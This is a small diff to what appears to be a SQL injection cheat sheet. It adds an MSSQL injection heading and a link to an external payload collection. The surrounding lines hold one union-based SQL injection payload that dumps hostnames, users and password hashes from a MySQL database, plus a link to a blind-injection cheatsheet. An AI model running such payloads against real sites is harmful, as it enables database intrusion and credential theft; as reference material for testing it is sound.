@@ -391,6 +391,9 @@ Show hostname, user, hashed password of a database from union SQLi:
 php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
 ```
 
+### MSSQL Injection:\
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
+
 ### Blind SQL Injection:
 Read more: https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi#mysql-boolean-based-blind-sql-injection-cheatsheet
 
